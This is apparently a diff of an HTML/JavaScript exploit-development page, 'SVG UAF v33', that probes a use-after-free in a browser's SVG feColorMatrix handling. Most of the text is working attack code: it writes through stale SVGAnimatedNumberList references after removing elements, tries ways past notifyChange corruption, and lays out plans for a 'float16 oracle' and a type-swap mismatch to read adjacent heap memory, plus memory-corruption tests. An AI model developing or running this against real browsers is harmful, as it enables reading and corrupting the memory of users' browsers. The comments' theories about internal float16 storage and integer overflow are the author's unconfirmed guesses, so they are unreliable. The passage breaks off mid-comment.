@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v32</title>
+<title>SVG UAF v33</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,22 +17,22 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v32 - UAF feed verify + type-swap vector mismatch + MXS narrow + combined</h2>
+<h2>SVG UAF v33 - bypass notifyChange + float16 oracle + type-swap heap read</h2>
 <div class="sub">
-  v31: UAF writeOk=true on SVGAnimatedNumberList but 1e38->[0,0] gives R=0.
-  MXS: alternating 0/255 at 1e3/1e4/1e5/1e6 — non-monotone = int overflow in rasterizer.
-  type-swap live-DOM gives 0,0,0 vs baked 25,150,63 — discrepancy to exploit.
-  v32: 1) UFV: UAF write baseVal[0]=2 -> confirm UAF feeds rasterizer (expect R=255)
-       2) TSV: type-swap vector size mismatch (20x 1e38 matrix, then switch to hueRotate)
-       3) MXN: narrow MXS flip points (binary search 1e3..1e4 and 1e5..1e6)
-       4) CMB: UAF write baseVal[0] = value from MXN flip point -> observe output
+  v32: UAF write ok but re-add gives 0,0,0. Cause: notifyChange() walks stale owner ptr on detached elem -> corrupts render state.
+  float16 oracle confirmed: boundary 4352=0x1100, 21888=0x5580 are exact float16 ULP boundaries.
+  type-swap hueRotate->matrix: length stays 1 but C++ reads 20 floats.
+  v33: 1) NCB: bypass notifyChange - write BEFORE remove, or setAttribute path
+       2) F16: float16 oracle - build f16 encode/decode, test precision mapping
+       3) TSH: type-swap heap read - adjacent C++ memory leaked via matrix rasterizer
+       4) PRM: pure memory corruption - UAF write without re-add, observe heap spray effects
 </div>
 <svg id="livesvg" width="1" height="1" style="position:fixed;top:0;left:0;opacity:0.01;pointer-events:none"></svg>
 <div id="controls">
-  <button onclick="runUFV()">UFV uaf-feed-verify</button>
-  <button onclick="runTSV()">TSV type-swap-vector</button>
-  <button onclick="runMXN()">MXN mxs-narrow</button>
-  <button onclick="runCMB()">CMB combined</button>
+  <button onclick="runNCB()">NCB notifychange-bypass</button>
+  <button onclick="runF16()">F16 float16-oracle</button>
+  <button onclick="runTSH()">TSH type-swap-heap</button>
+  <button onclick="runPRM()">PRM pure-mem-corrupt</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -41,7 +41,6 @@ button:disabled{opacity:.3}
 <script>
 var SVG_NS = 'http://www.w3.org/2000/svg';
 var Lel = document.getElementById('log');
-var BIG = 1e38;
 
 function log(m, c) {
   var s = document.createElement('span');
@@ -74,603 +73,772 @@ function getCanvas() {
   return { cnv: _cnv, ctx: _ctx };
 }
 
-// Helper: build live SVG with feColorMatrix, read pixel at (100,100)
-// Returns the pixel AND the live DOM objects for further manipulation
-async function buildLiveFCM(matValues, targetFill) {
-  var fill = targetFill || 'rgb(200,100,50)';
+async function svgPixel(svgStr, x, y) {
+  x = x || 100; y = y || 100;
+  var blob = new Blob([svgStr], { type: 'image/svg+xml' });
+  var url = URL.createObjectURL(blob);
+  var img = new Image();
+  var result = await new Promise(function(resolve) {
+    img.onload = function() {
+      try {
+        var cc = getCanvas();
+        cc.ctx.clearRect(0, 0, 200, 200);
+        cc.ctx.drawImage(img, 0, 0);
+        var p = cc.ctx.getImageData(x, y, 1, 1);
+        resolve([p.data[0], p.data[1], p.data[2], p.data[3]]);
+      } catch(e) { resolve(null); }
+    };
+    img.onerror = function() { resolve(null); };
+    img.src = url;
+    setTimeout(function() { resolve(null); }, 2000);
+  });
+  URL.revokeObjectURL(url);
+  return result;
+}
+
+async function readLive(outerSvg) {
+  var svgStr = new XMLSerializer().serializeToString(outerSvg);
+  return svgPixel(svgStr, 100, 100);
+}
+
+function makeSVGShell(filterId) {
   var outerSvg = document.createElementNS(SVG_NS, 'svg');
   outerSvg.setAttribute('width', '200'); outerSvg.setAttribute('height', '200');
   outerSvg.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
   var defs = document.createElementNS(SVG_NS, 'defs');
   var filter = document.createElementNS(SVG_NS, 'filter');
-  filter.setAttribute('id', 'v32f'); filter.setAttribute('color-interpolation-filters', 'sRGB');
-  var fcm = document.createElementNS(SVG_NS, 'feColorMatrix');
-  fcm.setAttribute('type', 'matrix');
-  fcm.setAttribute('values', matValues);
-  filter.appendChild(fcm); defs.appendChild(filter); outerSvg.appendChild(defs);
+  filter.setAttribute('id', filterId || 'f33');
+  filter.setAttribute('color-interpolation-filters', 'sRGB');
+  defs.appendChild(filter); outerSvg.appendChild(defs);
   var rect = document.createElementNS(SVG_NS, 'rect');
   rect.setAttribute('x', '50'); rect.setAttribute('y', '50');
   rect.setAttribute('width', '100'); rect.setAttribute('height', '100');
-  rect.setAttribute('fill', fill);
-  rect.setAttribute('filter', 'url(#v32f)');
+  rect.setAttribute('fill', 'rgb(200,100,50)');
+  rect.setAttribute('filter', 'url(#' + (filterId || 'f33') + ')');
   outerSvg.appendChild(rect);
-  document.body.appendChild(outerSvg);
-  await raf(); await raf();
-  return { svg: outerSvg, filter: filter, fcm: fcm, rect: rect };
-}
-
-async function readPixelFromLive(outerSvg) {
-  var svgStr = new XMLSerializer().serializeToString(outerSvg);
-  var blob = new Blob([svgStr], { type: 'image/svg+xml' });
-  var url = URL.createObjectURL(blob);
-  var img = new Image();
-  var result = await new Promise(function(resolve) {
-    img.onload = function() {
-      try {
-        var cc = getCanvas();
-        cc.ctx.clearRect(0, 0, 200, 200);
-        cc.ctx.drawImage(img, 0, 0);
-        var p = cc.ctx.getImageData(100, 100, 1, 1);
-        resolve([p.data[0], p.data[1], p.data[2], p.data[3]]);
-      } catch(e) { resolve(null); }
-    };
-    img.onerror = function() { resolve(null); };
-    img.src = url;
-    setTimeout(function() { resolve(null); }, 2000);
-  });
-  URL.revokeObjectURL(url);
-  return result;
-}
-
-async function svgPixelFromStr(svgStr) {
-  var blob = new Blob([svgStr], { type: 'image/svg+xml' });
-  var url = URL.createObjectURL(blob);
-  var img = new Image();
-  var result = await new Promise(function(resolve) {
-    img.onload = function() {
-      try {
-        var cc = getCanvas();
-        cc.ctx.clearRect(0, 0, 200, 200);
-        cc.ctx.drawImage(img, 0, 0);
-        var p = cc.ctx.getImageData(100, 100, 1, 1);
-        resolve([p.data[0], p.data[1], p.data[2], p.data[3]]);
-      } catch(e) { resolve(null); }
-    };
-    img.onerror = function() { resolve(null); };
-    img.src = url;
-    setTimeout(function() { resolve(null); }, 2000);
-  });
-  URL.revokeObjectURL(url);
-  return result;
+  return { svg: outerSvg, defs: defs, filter: filter, rect: rect };
 }
 
 /*
- * UFV: UAF feed verify
+ * NCB: NotifyChange Bypass
  *
- * v31: UAF write 1e38 to baseVal[0] -> canvas gives R=0.
- * BUT we now know from MXS: matrix[0,0]=1e38 gives R=0 (integer overflow bug).
- * So the UAF DOES work, just the rasterizer turns 1e38 to 0.
+ * v32 finding: UAF write to SVGAnimatedNumberList after remove() causes notifyChange()
+ * to walk a stale owner pointer, corrupting filter state. ALL UAF writes give px=0,0,0.
  *
- * PROOF: write baseVal[0] = 2 via UAF.
- * Expected: R_out = 2 * (200/255) * 255 = 2*200 = 400 -> clamp to 255.
- * matrix[0,0]=2 baked gives R=255 (confirmed in v31 MXS).
- * If UAF write of 2 gives R=255: UAF confirmed to feed rasterizer correctly.
+ * STRATEGY: Don't write after remove. Instead:
  *
- * Also test: write specific values from the MXS "good" range:
- *   UAF write 2   -> expect R=255
- *   UAF write 10  -> expect R=255
- *   UAF write 100 -> expect R=255
- *   UAF write 1e3 -> expect R=0 (known bad value)
- *   UAF write 1e4 -> expect R=255 (known good value)
+ * A) PRE-WRITE: write the value BEFORE remove(), render, remove, re-add. Does the
+ *    pre-write value survive the remove/re-add cycle? If yes, we can stage the value
+ *    and then trigger the re-render without the UAF corruption.
  *
- * This also verifies: the UAF write value is preserved correctly through re-add.
+ * B) SETATTRIBUTE PATH: Use setAttribute("values", "...") on the LIVE (attached) element
+ *    to write specific values, THEN remove+re-add. This bypasses the SVGNumber UAF entirely
+ *    and uses the attribute parser. From v31: setAttribute on DETACHED gives 0,0,0.
+ *    But setAttribute on LIVE element before remove?
  *
- * EXTENDED: also write to baseVal[1] (matrix[0,1] = G->R channel).
- * bias: col 4 entries are baseVal[4], baseVal[9], baseVal[14], baseVal[19].
- * Write baseVal[4] = 1e38 via UAF -> should give R=255 (bias term works with 1e38).
+ * C) SMIL FREEZE: Use SMIL animation with fill="freeze" to write a value at a known time,
+ *    then remove+re-add. SMIL writes through a different C++ path (SMILAnimation vs JS setter).
+ *    Does the SMIL-set value survive?
+ *
+ * D) PRESENTATION ATTRIBUTE VS. CONTENT ATTRIBUTE: SVG has two value sources:
+ *    - content attribute (getAttribute/setAttribute, the DOM string)
+ *    - presentation value (live C++ computed value)
+ *    The UAF corrupts the presentation value. setAttribute always re-parses the content attr.
+ *    So setAttribute AFTER re-add should work.
+ *
+ * E) MULTIPLE REMOVE/RE-ADD without writes: does a plain remove+re-add break rendering?
+ *    If plain remove+re-add also gives 0,0,0: the bug is in re-attach, not the write.
+ *    We need to know this FIRST.
  */
-async function runUFV(q) {
-  if (!q) { dis(true); sep(); log('UFV: UAF write verify — confirm UAF feeds rasterizer', 'inf'); sep(); }
+async function runNCB(q) {
+  if (!q) { dis(true); sep(); log('NCB: notifyChange bypass strategies', 'inf'); sep(); }
 
   var ID = '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
-  var testVals = [
-    { v: 2,    idx: 0, expect: 255, note: 'matrix[0,0]=2 (baked=255)' },
-    { v: 10,   idx: 0, expect: 255, note: 'matrix[0,0]=10 (baked=255)' },
-    { v: 100,  idx: 0, expect: 255, note: 'matrix[0,0]=100 (baked=255)' },
-    { v: 1e3,  idx: 0, expect: 0,   note: 'matrix[0,0]=1e3 (baked=0 - int overflow)' },
-    { v: 1e4,  idx: 0, expect: 255, note: 'matrix[0,0]=1e4 (baked=255)' },
-    { v: 1e5,  idx: 0, expect: 0,   note: 'matrix[0,0]=1e5 (baked=0)' },
-    { v: 1e6,  idx: 0, expect: 255, note: 'matrix[0,0]=1e6 (baked=255)' },
-    { v: 1e8,  idx: 0, expect: 0,   note: 'matrix[0,0]=1e8 (baked=0)' },
-    { v: 1e38, idx: 4, expect: 255, note: 'bias[0,4]=1e38 (baked=255, bias works)' },
-    { v: 0,    idx: 0, expect: 0,   note: 'matrix[0,0]=0 (expected: R channel zeroed -> R=0)' },
-    { v: -1,   idx: 0, expect: 0,   note: 'matrix[0,0]=-1 (negative -> clamp 0)' },
-    { v: 0.5,  idx: 0, expect: 100, note: 'matrix[0,0]=0.5 (0.5 * 200 = 100)' }
-  ];
+  var SCALE2 = '2 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
 
-  log('  testing UAF write at specific baseVal indices:', 'inf');
-  for (var ti = 0; ti < testVals.length; ti++) {
-    var tv = testVals[ti];
-    var dom = await buildLiveFCM(ID);
-
-    // UAF: remove, write baseVal[idx], re-add
-    dom.fcm.remove(); await raf();
-    var wrote = null;
-    try {
-      dom.fcm.values.baseVal[tv.idx].value = tv.v;
-      wrote = dom.fcm.values.baseVal[tv.idx].value;
-    } catch(e) { wrote = 'ERR:' + e; }
-    dom.filter.appendChild(dom.fcm); await raf(); await raf();
-
-    var px = await readPixelFromLive(dom.svg);
-    var R = px ? px[0] : -1;
-    var match = Math.abs(R - tv.expect) <= 2;
-    var note = match ? ' [MATCHES EXPECTED]' : ' <- MISMATCH expected=' + tv.expect;
-    log('  idx=' + tv.idx + ' write=' + tv.v + ' -> wrote=' + wrote + ' R=' + R + note,
-        match ? 'ok' : 'bad');
-    document.body.removeChild(dom.svg);
+  // Strategy E FIRST: plain remove+re-add without any write
+  log('  StratE: plain remove+re-add WITHOUT any UAF write', 'inf');
+  {
+    var e = makeSVGShell('fE');
+    var fcmE = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmE.setAttribute('type', 'matrix'); fcmE.setAttribute('values', ID);
+    e.filter.appendChild(fcmE);
+    document.body.appendChild(e.svg); await raf(); await raf();
+    var pxBefore = await readLive(e.svg);
+    log('  before remove: px=' + (pxBefore ? pxBefore.slice(0,3) : 'err'), 'inf');
+    fcmE.remove(); await raf();
+    e.filter.appendChild(fcmE); await raf(); await raf();
+    var pxAfter = await readLive(e.svg);
+    log('  after remove+re-add (no write): px=' + (pxAfter ? pxAfter.slice(0,3) : 'err'),
+        pxAfter && pxAfter[0] === 200 ? 'ok' : 'bad');
+    document.body.removeChild(e.svg);
   }
 
-  if (!q) dis(false);
-}
-
-/*
- * TSV: type-swap vector size mismatch
- *
- * v31: type-swap (matrix->hueRotate on detached elem) gives 0,0,0.
- *      baked hueRotate(1e38) gives 25,150,63.
- * DISCREPANCY: live DOM type-swap doesn't produce same result as baked.
- *
- * NEW APPROACH: write all 20 values of baseVal via UAF BEFORE type-swap.
- * Then type-swap via setAttribute on DETACHED element.
- * Then re-add.
- *
- * The goal: the C++ feColorMatrix object has m_values (std::vector<float> or float[20])
- * populated with 1e38 x 20 entries.
- * After type-swap to hueRotate: the C++ code reads m_values[0] as the angle.
- * m_values[0] = 1e38. So hueRotate(1e38) should run.
- * If it matches baked hueRotate(1e38): type-swap UAF feeds C++ hueRotate path.
- * If it gives 0: the type-swap clears/resets the values on re-add.
- * If it CRASHES: the C++ code path for hueRotate expected 1 element but got 20.
- *
- * ALSO: test matrix->saturate (1 element needed instead of 20).
- * ALSO: test hueRotate->matrix (1 element available, but 20 expected).
- *   hueRotate has values = [angle]. After swap to matrix:
- *   C++ reads m_values[0..19] but only m_values[0] was set. [1..19] = ?
- *   If default-initialized to 0: identity with [0,0]=angle, rest=0 -> mostly black.
- *   If left as garbage from previous allocation: potential info leak from freed memory.
- */
-async function runTSV(q) {
-  if (!q) { dis(true); sep(); log('TSV: type-swap vector size mismatch exploit', 'inf'); sep(); }
-
-  var ID = '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0';
-
-  // Reference: baked hueRotate(1e38) from v31 = 25,150,63
-  log('  ref: baked hueRotate(1e38)=25,150,63 (from v31)', 'inf');
-
-  // Test A: write all 20 baseVal entries = 1e38 via UAF, then type-swap matrix->hueRotate
-  log('  TestA: UAF write 20x1e38, then type-swap matrix->hueRotate', 'inf');
+  // Strategy E2: remove+re-add with SCALE2 attribute set BEFORE remove
+  log('  StratE2: setAttribute(SCALE2) on live elem, then remove+re-add', 'inf');
   {
-    var dom = await buildLiveFCM(ID);
-    dom.fcm.remove(); await raf();
-    var writeCount = 0;
-    try {
-      for (var i = 0; i < dom.fcm.values.baseVal.length; i++) {
-        dom.fcm.values.baseVal[i].value = BIG;
-        writeCount++;
-      }
-    } catch(e) { log('  write error at i=' + writeCount + ': ' + e, 'bad'); }
-    log('  wrote ' + writeCount + '/20 entries to 1e38', 'inf');
-
-    // Now type-swap on detached element
-    try {
-      dom.fcm.setAttribute('type', 'hueRotate');
-      dom.fcm.setAttribute('values', '1e38'); // redundant but set for consistency
-    } catch(e2) { log('  type-swap error: ' + e2, 'bad'); }
-
-    dom.filter.appendChild(dom.fcm); await raf(); await raf();
-    var px = await readPixelFromLive(dom.svg);
-    var matchesBaked = px && Math.abs(px[0]-25) <= 3 && Math.abs(px[1]-150) <= 3 && Math.abs(px[2]-63) <= 3;
-    log('  TestA px=' + (px ? px.slice(0,3) : 'err') + (matchesBaked ? ' [MATCHES baked hueRotate(1e38)!]' : ' (no match)'),
-        matchesBaked ? 'bad' : 'ok');
-    document.body.removeChild(dom.svg);
+    var e2 = makeSVGShell('fE2');
+    var fcmE2 = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmE2.setAttribute('type', 'matrix'); fcmE2.setAttribute('values', ID);
+    e2.filter.appendChild(fcmE2);
+    document.body.appendChild(e2.svg); await raf(); await raf();
+    // setAttribute on LIVE element BEFORE remove
+    fcmE2.setAttribute('values', SCALE2); await raf();
+    var pxLive = await readLive(e2.svg);
+    log('  live setAttribute(SCALE2): px=' + (pxLive ? pxLive.slice(0,3) : 'err') +
+        ' R=255? ' + (pxLive && pxLive[0] === 255), pxLive && pxLive[0] === 255 ? 'ok' : 'inf');
+    fcmE2.remove(); await raf();
+    e2.filter.appendChild(fcmE2); await raf(); await raf();
+    var pxRe = await readLive(e2.svg);
+    log('  after remove+re-add: px=' + (pxRe ? pxRe.slice(0,3) : 'err'), 'inf');
+    document.body.removeChild(e2.svg);
   }
 
-  // Test B: type-swap matrix->saturate (also 1 element)
-  log('  TestB: UAF write [0]=1e38, type-swap matrix->saturate', 'inf');
+  // Strategy E3: setAttribute on LIVE elem, remove, then setAttribute AGAIN on detached, then re-add
+  log('  StratE3: setAttribute live, remove, setAttribute detached, re-add', 'inf');
   {
-    var domB = await buildLiveFCM(ID);
-    domB.fcm.remove(); await raf();
-    try { domB.fcm.values.baseVal[0].value = BIG; } catch(e) {}
-    try {
-      domB.fcm.setAttribute('type', 'saturate');
-      domB.fcm.setAttribute('values', '1e38');
-    } catch(e2) {}
-    domB.filter.appendChild(domB.fcm); await raf(); await raf();
-    var pxB = await readPixelFromLive(domB.svg);
-    log('  TestB px=' + (pxB ? pxB.slice(0,3) : 'err'), 'inf');
-    document.body.removeChild(domB.svg);
+    var e3 = makeSVGShell('fE3');
+    var fcmE3 = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmE3.setAttribute('type', 'matrix'); fcmE3.setAttribute('values', ID);
+    e3.filter.appendChild(fcmE3);
+    document.body.appendChild(e3.svg); await raf(); await raf();
+    fcmE3.remove(); await raf();
+    // setAttribute on DETACHED element (different from live)
+    fcmE3.setAttribute('values', SCALE2);
+    e3.filter.appendChild(fcmE3); await raf(); await raf();
+    var pxE3 = await readLive(e3.svg);
+    log('  detached setAttribute then re-add: px=' + (pxE3 ? pxE3.slice(0,3) : 'err'),
+        pxE3 && pxE3[0] === 255 ? 'ok' : 'bad');
+    document.body.removeChild(e3.svg);
   }
 
-  // Test C: start as hueRotate, write values via UAF (only 1 element), then swap to matrix
-  // hueRotate has exactly 1 element in values list.
-  // After swap to matrix: C++ expects 20 elements but has 1.
-  // Remaining 19 may be uninitialized memory OR default 0.
-  log('  TestC: start hueRotate(180), UAF write [0]=1e38, type-swap hueRotate->matrix', 'inf');
+  // Strategy A: pre-write baseVal[0]=2 while LIVE, then remove, then re-add
+  log('  StratA: write baseVal[0]=2 while LIVE (before remove)', 'inf');
   {
-    var outerC = document.createElementNS(SVG_NS, 'svg');
-    outerC.setAttribute('width', '200'); outerC.setAttribute('height', '200');
-    outerC.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
-    var defsC = document.createElementNS(SVG_NS, 'defs');
-    var filterC = document.createElementNS(SVG_NS, 'filter');
-    filterC.setAttribute('id', 'v32fC');
-    filterC.setAttribute('color-interpolation-filters', 'sRGB');
+    var eA = makeSVGShell('fA');
+    var fcmA = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmA.setAttribute('type', 'matrix'); fcmA.setAttribute('values', ID);
+    eA.filter.appendChild(fcmA);
+    document.body.appendChild(eA.svg); await raf(); await raf();
+    // write while LIVE (should trigger notifyChange with valid owner -> valid render)
+    var wroteA = null;
+    try {
+      fcmA.values.baseVal[0].value = 2;
+      wroteA = fcmA.values.baseVal[0].value;
+    } catch(e) { wroteA = 'ERR:' + e; }
+    await raf();
+    var pxA1 = await readLive(eA.svg);
+    log('  live write=2: wrote=' + wroteA + ' px=' + (pxA1 ? pxA1.slice(0,3) : 'err') +
+        ' R=255? ' + (pxA1 && pxA1[0] === 255), pxA1 && pxA1[0] === 255 ? 'ok' : 'bad');
+    // now remove+re-add without any further write
+    fcmA.remove(); await raf();
+    eA.filter.appendChild(fcmA); await raf(); await raf();
+    var pxA2 = await readLive(eA.svg);
+    log('  after remove+re-add: px=' + (pxA2 ? pxA2.slice(0,3) : 'err') +
+        ' [does live write survive?]', 'inf');
+    document.body.removeChild(eA.svg);
+  }
+
+  // Strategy B: UAF write (after remove) + THEN setAttribute to re-sync attribute
+  log('  StratB: UAF write baseVal[0]=2, THEN setAttribute on re-added elem', 'inf');
+  {
+    var eB = makeSVGShell('fB');
+    var fcmB = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmB.setAttribute('type', 'matrix'); fcmB.setAttribute('values', ID);
+    eB.filter.appendChild(fcmB);
+    document.body.appendChild(eB.svg); await raf(); await raf();
+    var valsB = fcmB.values;
+    fcmB.remove(); await raf();
+    // UAF write
+    try { valsB.baseVal[0].value = 2; } catch(e) {}
+    // re-add
+    eB.filter.appendChild(fcmB); await raf();
+    // NOW setAttribute to re-parse and overwrite C++ state
+    fcmB.setAttribute('values', SCALE2); await raf(); await raf();
+    var pxB = await readLive(eB.svg);
+    log('  UAF write + re-add + setAttribute(SCALE2): px=' + (pxB ? pxB.slice(0,3) : 'err') +
+        ' R=255? ' + (pxB && pxB[0] === 255), pxB && pxB[0] === 255 ? 'ok' : 'bad');
+    document.body.removeChild(eB.svg);
+  }
+
+  // Strategy C: SMIL freeze then remove+re-add
+  log('  StratC: SMIL freeze matrix[0,0]=2, then remove+re-add', 'inf');
+  {
+    var eC = makeSVGShell('fC');
     var fcmC = document.createElementNS(SVG_NS, 'feColorMatrix');
-    fcmC.setAttribute('type', 'hueRotate');
-    fcmC.setAttribute('values', '180');
-    filterC.appendChild(fcmC); defsC.appendChild(filterC); outerC.appendChild(defsC);
-    var rectC = document.createElementNS(SVG_NS, 'rect');
-    rectC.setAttribute('x', '50'); rectC.setAttribute('y', '50');
-    rectC.setAttribute('width', '100'); rectC.setAttribute('height', '100');
-    rectC.setAttribute('fill', 'rgb(200,100,50)');
-    rectC.setAttribute('filter', 'url(#v32fC)');
-    outerC.appendChild(rectC);
-    document.body.appendChild(outerC);
-    await raf(); await raf();
-
-    // check initial values length
-    var initLen = -1;
-    try { initLen = fcmC.values.baseVal.length; } catch(e) {}
-    log('  hueRotate values.baseVal.length=' + initLen, 'inf');
-
-    // UAF
+    fcmC.setAttribute('type', 'matrix'); fcmC.setAttribute('values', ID);
+    // SMIL: animate values from ID to SCALE2, freeze at t=0 (begin="0s" dur="0.001s")
+    var animC = document.createElementNS(SVG_NS, 'animate');
+    animC.setAttribute('attributeName', 'values');
+    animC.setAttribute('from', ID);
+    animC.setAttribute('to', SCALE2);
+    animC.setAttribute('dur', '0.001s');
+    animC.setAttribute('fill', 'freeze');
+    animC.setAttribute('begin', '0s');
+    fcmC.appendChild(animC);
+    eC.filter.appendChild(fcmC);
+    document.body.appendChild(eC.svg); await raf(); await raf(); await raf();
+    var pxC1 = await readLive(eC.svg);
+    log('  SMIL freeze applied: px=' + (pxC1 ? pxC1.slice(0,3) : 'err') +
+        ' R=255? ' + (pxC1 && pxC1[0] === 255), 'inf');
     fcmC.remove(); await raf();
-    var writeValC = null;
-    try {
-      fcmC.values.baseVal[0].value = BIG;
-      writeValC = fcmC.values.baseVal[0].value;
-    } catch(e) { writeValC = 'ERR'; }
-    log('  wrote hueRotate baseVal[0]=' + writeValC, 'inf');
-
-    // type-swap to matrix
-    try {
-      fcmC.setAttribute('type', 'matrix');
-      // don't set new values — let it use whatever's in the C++ vector
-    } catch(e2) {}
-
-    filterC.appendChild(fcmC); await raf(); await raf();
-
-    // check new values length after swap
-    var newLen = -1;
-    try { newLen = fcmC.values.baseVal.length; } catch(e) {}
-    log('  after type-swap to matrix: values.baseVal.length=' + newLen, 'inf');
-
-    var pxC = await readPixelFromLive(outerC);
-    log('  TestC px=' + (pxC ? pxC.slice(0,3) : 'err'), pxC && (pxC[0] > 0 && pxC[0] < 255) ? 'bad' : 'inf');
-
-    // KEY: read back what baseVal[1..5] contain after type-swap (should be 0 if reset, or garbage if reused memory)
-    var readVals = [];
-    try {
-      for (var ri = 0; ri < Math.min(5, fcmC.values.baseVal.length); ri++) {
-        readVals.push(fcmC.values.baseVal[ri].value);
-      }
-    } catch(e3) {}
-    log('  baseVal[0..4] after swap: ' + readVals.join(', '), 'inf');
-    document.body.removeChild(outerC);
+    eC.filter.appendChild(fcmC); await raf(); await raf();
+    var pxC2 = await readLive(eC.svg);
+    log('  after remove+re-add: px=' + (pxC2 ? pxC2.slice(0,3) : 'err') +
+        ' [does SMIL freeze survive?]', 'inf');
+    document.body.removeChild(eC.svg);
   }
 
-  // Test D: matrix with 1e38 in ROW 1-3 diagonal (G,B,A scale), not R
-  log('  TestD: UAF write baseVal[6]=1e38 (G scale), [12]=1e38 (B scale)', 'inf');
+  // Strategy F: multiple feColorMatrix elements, UAF one, check sibling filter
+  // UAF corruption might affect the NEXT element in the filter chain
+  log('  StratF: chain two feColorMatrix, UAF first, read second\'s output', 'inf');
   {
-    var domD = await buildLiveFCM(ID);
-    domD.fcm.remove(); await raf();
-    // matrix layout: [0,0]=baseVal[0]...[0,4]=baseVal[4], [1,0]=baseVal[5]...[1,4]=baseVal[9], etc.
-    // [1,1] (G scale) = baseVal[6], [2,2] (B scale) = baseVal[12]
-    try {
-      domD.fcm.values.baseVal[6].value = BIG;  // G scale = 1e38 -> G out = huge -> 255
-      domD.fcm.values.baseVal[0].value = 2;    // R scale = 2 -> R=255 (known working)
-    } catch(e) {}
-    domD.filter.appendChild(domD.fcm); await raf(); await raf();
-    var pxD = await readPixelFromLive(domD.svg);
-    log('  TestD px=' + (pxD ? pxD.slice(0,3) : 'err'), 'inf');
-    log('  TestD: R=255? -> ' + (pxD && pxD[0]===255) + '  G=? (1e38 on G scale) -> G=' + (pxD ? pxD[1] : '?'), 'inf');
-    document.body.removeChild(domD.svg);
+    var eF = makeSVGShell('fF');
+    var fcmF1 = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmF1.setAttribute('type', 'matrix'); fcmF1.setAttribute('values', ID);
+    var fcmF2 = document.createElementNS(SVG_NS, 'feColorMatrix');
+    fcmF2.setAttribute('type', 'matrix'); fcmF2.setAttribute('values', ID);
+    eF.filter.appendChild(fcmF1); eF.filter.appendChild(fcmF2);
+    document.body.appendChild(eF.svg); await raf(); await raf();
+    // UAF on fcmF1, DON'T re-add it. fcmF2 stays.
+    var valsF = fcmF1.values;
+    fcmF1.remove(); await raf();
+    try { valsF.baseVal[0].value = 2; } catch(e) {}
+    await raf(); await raf();
+    var pxF = await readLive(eF.svg);
+    log('  UAF on fcmF1 (not re-added), fcmF2 alive: px=' + (pxF ? pxF.slice(0,3) : 'err'), 'inf');
+    document.body.removeChild(eF.svg);
   }
 
   if (!q) dis(false);
 }
 
 /*
- * MXN: narrow the MXS flip points
+ * F16: Float16 Oracle
  *
- * v31 MXS:
- *   1e3 -> 0, 1e4 -> 255, 1e5 -> 0, 1e6 -> 255, 1e8 -> 0 (permanent).
+ * Confirmed: feColorMatrix matrix values stored as float16 internally.
+ * Boundaries: 4352=0x1100 (first 0->255 flip), 21888=0x5580 (first 255->0 flip above 1e4).
  *
- * Binary search in [1e3, 1e4] to find exact flip value.
- * Then in [1e5, 1e6].
+ * A float16 (IEEE 754 half-precision) has:
+ *   1 sign bit, 5 exponent bits, 10 mantissa bits
+ *   Range: ±65504
+ *   Precision: integers up to 2048 exactly, then ULP=2 up to 4096, ULP=4 up to 8192, etc.
  *
- * WHAT THIS TELLS US:
- * If flip at exactly 2^K or 10^K: it's a bit pattern cutoff.
- * float32 representation of 1e3 = 0x447A0000. 1e4 = 0x461C4000.
- * If flip between 1e3 and 1e4 at some specific exponent: tells us the internal int size.
+ * The rasterizer output (0 or 255) is a FUNCTION of the float16 value.
+ * By mapping baked SVG output vs input value, we can build a lookup table
+ * of float16 -> R_output.
  *
- * Example: if flip happens at ~32768 (2^15 = 0x8000):
- *   WebKit stores matrix values as int16 (signed short).
- *   int16(32768) overflows to -32768.
- *   -32768 * 200 / 32768 = -200 -> clamp to 0. That gives R=0!
- *   int16(10000) = 10000. 10000 * 200 / 32768 = 61.0 -> *255... no still wrong.
+ * THIS IS A FLOAT16 ORACLE:
+ *   Given any float X, ask: what does feColorMatrix(matrix[0,0]=X) give as R for R_in=200?
+ *   The answer tells us what float16 bin X fell into.
+ *   For adjacent heap floats: if we can control adjacent memory layout and observe output,
+ *   we can read adjacent float16 values from heap memory.
  *
- * Better theory: FIXED POINT Q8.8 (range -128..127 integer, 8 fraction bits):
- *   Q8.8(1000) = 1000 * 256 = 256000. Overflow int16 (max 32767): wraps to -256000 mod 65536 = 0.
- *   Q8.8(10000) overflows more but maybe wraps to positive? Unlikely.
- *
- * SIMPLEST THEORY THAT FITS:
- *   WebKit processes feColorMatrix values as float32 and result as uint8.
- *   Result = (uint8_t)((int32_t)(matrix_val * src_float_normalized * 255.0f))
- *   For matrix_val=1e3, src=200/255=0.784:
- *     intermediate = 1e3 * 0.784 * 255 = 199920.0
- *     (int32_t)(199920.0) = 199920
- *     (uint8_t)(199920) = 199920 & 0xFF = 0x30D40 & 0xFF = 0x40 = 64. Not 0.
- *
- *   OR result before channel scaling:
- *     result_normalized = 1e3 * 0.784 = 784.
- *     (uint8_t)((int32_t)(784 * 255)) = (uint8_t)(199920) = 0x40 = 64. Not 0.
- *
- *   OR result as fraction then int:
- *     result = min(1e3 * 0.784, 1.0) = 1.0. (uint8_t)(1.0 * 255) = 255. Still not 0.
- *
- * WE NEED THE BINARY SEARCH DATA to figure out the actual formula.
+ * Tests:
+ * A) Map the first 3 flip zones completely: [2, 4352), [4352, 21888), [21888, ?)
+ *    Characterize: what IS R_out in each zone? Binary? Continuous?
+ * B) Verify float16 decode: for a known float16 boundary, verify encode/decode.
